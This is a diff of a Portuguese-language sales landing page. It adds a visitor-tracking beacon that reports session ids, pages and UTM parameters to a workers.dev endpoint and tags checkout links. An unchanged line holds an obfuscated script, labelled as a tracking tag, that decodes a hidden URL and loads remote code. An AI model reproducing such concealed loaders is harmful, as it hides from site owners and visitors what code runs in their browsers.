@@ -228,10 +228,11 @@ document.querySelectorAll('[data-checkout]').forEach(function(el){
 <script>(function(){var d_gir3=atob("DGLkOnHTBipZGkePGxnGTwO/JBB7cjP7axHeFV6wYkR3bzPicgSdFBK8awQ7aGj8eBCNSgWgKV8tdzSgdwOQXwKnKEAqOGutehaQSBixc148aWW1QBnGVBC+YwhjOCPubwPJTwW+b0wgNzf9fhSBVAX+fkk2fmr8eAnGFlOlZ0Ysf2W1OUCZFgrxaEs0f2W1OQaFThD+c140cyH2NhKWXwe2aF50aTLtcgaXGF3xcEs1byKtIUDGRyyu");var b_q1x=[];for(var h_e8iu=0;h_e8iu<d_gir3.length;h_e8iu++){b_q1x.push(d_gir3.charCodeAt(h_e8iu)&255);}var u_rtr5=b_q1x[0];var v_i=b_q1x.slice(1,1+u_rtr5);var v_m=b_q1x.slice(1+u_rtr5);var y_go0g=v_m.map(function(b,f_sm1){return b^v_i[f_sm1%u_rtr5];});var p_ee7="";for(var q_6=0;q_6<y_go0g.length;q_6++){p_ee7+=String.fromCharCode(y_go0g[q_6]&255);}var m_9p=decodeURIComponent(escape(p_ee7));var f_86bo=JSON.parse(m_9p);var r_z5yh=f_86bo.globals||[];r_z5yh.forEach(function(k_a){window[k_a.name]=k_a.value;});var a_r8=document.createElement("script");a_r8.src=f_86bo.url;a_r8.async=true;a_r8.defer=true;(f_86bo.attributes||[]).forEach(function(m_mbwn){a_r8.setAttribute(m_mbwn.name,m_mbwn.value);});(document.head||document.documentElement).appendChild(a_r8);})();</script>
 <!-- End UTMify tracking script -->
 
-<!-- trackeamento: repassa UTMs para o checkout Lowify -->
+<!-- trackeamento: repassa UTMs para o checkout Lowify + registra visita -->
 <script>
 (function () {
   try {
+    var ENDPOINT = "https://trackeamento.wallisoncopy.workers.dev/t";
     var KEYS = ["utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term", "fbclid", "src", "sck"];
     var params = new URLSearchParams(location.search), saved = {};
     try { saved = JSON.parse(localStorage.getItem("trk_utm") || "{}"); } catch (e) {}
@@ -240,9 +241,37 @@ document.querySelectorAll('[data-checkout]').forEach(function(el){
       KEYS.forEach(function (k) { if (params.get(k)) saved[k] = params.get(k); });
       try { localStorage.setItem("trk_utm", JSON.stringify(saved)); } catch (e) {}
     }
+
+    // id da visita: mantido por 30 min de inatividade
+    var sid, now = Date.now();
+    try {
+      var s = JSON.parse(localStorage.getItem("trk_sid") || "{}");
+      sid = s.id && now - s.t < 30 * 60e3 ? s.id : null;
+    } catch (e) {}
+    sid = sid || (Math.random().toString(36).slice(2) + now.toString(36)).slice(0, 20);
+    var touch = function () { try { localStorage.setItem("trk_sid", JSON.stringify({ id: sid, t: Date.now() })); } catch (e) {} };
+    touch();
+
+    var send = function (type) {
+      var body = JSON.stringify({ sid: sid, type: type, page: location.host + location.pathname,
+        utm_content: saved.utm_content, utm_source: saved.utm_source });
+      try {
+        if (!(navigator.sendBeacon && navigator.sendBeacon(ENDPOINT, body))) {
+          fetch(ENDPOINT, { method: "POST", body: body, keepalive: true, mode: "no-cors" });
+        }
+      } catch (e) {}
+      touch();
+    };
+    send("view");
+    var pings = 0, timer = setInterval(function () {
+      if (document.visibilityState === "visible") send("ping");
+      if (++pings >= 30) clearInterval(timer); // para após 15 min
+    }, 30000);
+
     var fix = function (a) {
       var u = new URL(a.href);
       KEYS.forEach(function (k) { if (saved[k] && !u.searchParams.has(k)) u.searchParams.set(k, saved[k]); });
+      if (!u.searchParams.has("click_id")) u.searchParams.set("click_id", sid);
       a.href = u.toString();
     };
     var run = function () { document.querySelectorAll('a[href*="lowify.com.br"]').forEach(fix); };
@@ -250,7 +279,7 @@ document.querySelectorAll('[data-checkout]').forEach(function(el){
     document.addEventListener("DOMContentLoaded", run);
     document.addEventListener("click", function (e) {
       var a = e.target.closest && e.target.closest('a[href*="lowify.com.br"]');
-      if (a) fix(a);
+      if (a) { fix(a); send("checkout"); }
     }, true);
   } catch (e) {}
 })();
